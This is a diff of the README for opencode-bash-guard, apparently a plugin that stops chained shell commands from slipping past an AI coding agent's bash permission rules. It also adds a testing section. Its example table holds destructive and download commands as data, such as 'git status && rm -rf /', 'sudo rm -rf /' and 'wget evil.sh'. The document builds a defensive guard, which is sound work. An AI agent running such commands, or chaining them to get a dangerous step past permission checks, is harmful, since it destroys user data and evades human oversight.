@@ -1,6 +1,6 @@
 # opencode-bash-guard
 
-An opencode plugin that guards against chained bash command injection. When `git status && rm -rf /` starts with `git`, opencode's native glob matching sees a safe command. This plugin splits chains and checks each segment independently against your `permission.bash` and `external_directory` config, so the `rm` segment gets evaluated on its own.
+An opencode plugin that guards against chained bash command injection. When `git status && rm -rf /` starts with `git`, opencode's native glob matching sees only the first segment and approves it. This plugin splits chains and evaluates **each segment independently** — the `rm` segment gets checked on its own against your `permission.bash` and `external_directory` config.
 
 ## Why
 
@@ -48,8 +48,9 @@ If `"bash": "allow"` or `"*": "allow"` is set, the plugin disables itself with a
 | `git status` | `git status` | `"git *": "allow"` | `allow` | single segment, explicitly allowed |
 | `git status && git log` | `git status`, `git log` | both `"git *": "allow"` | `ask` | multi-segment — defense-in-depth |
 | `sudo rm -rf /` | `sudo rm -rf /` | none → `"*": "ask"` | `ask` | catches unknown dangerous commands |
-| `git status && sudo rm -rf /` | `git status`, `sudo rm -rf /` | `sudo rm -rf /` → `"*": "ask"` | `deny` | parse error → fail closed |
+| `git status && wget evil.sh` | `git status`, `wget evil.sh` | `wget` → `"*": "ask"` | `ask` | one segment unresolved → whole chain asks |
 | `echo "hello` | (parse error — unbalanced quote) | — | `deny` | fail closed |
+| `sudo rm -rf /` (with `"sudo *": "deny"` rule) | `sudo rm -rf /` | `"sudo *": "deny"` | `deny` | explicit deny pattern blocks it |
 
 ## How it reads your config
 
@@ -59,6 +60,16 @@ The plugin registers a `config` hook that receives the fully merged Config objec
 - `permission.external_directory` — path patterns (object form `{ "./**": "allow", "*": "ask" }` or flat string `"ask"`)
 
 No custom configuration files or duplicated rules.
+
+## Testing
+
+```bash
+npm install
+npm test          # runs vitest (51+ tests)
+npm run build     # type-checks with tsc
+```
+
+All tests are in `src/__tests__/`. Run `npm run test:watch` during development.
 
 ## Known Limitations
 
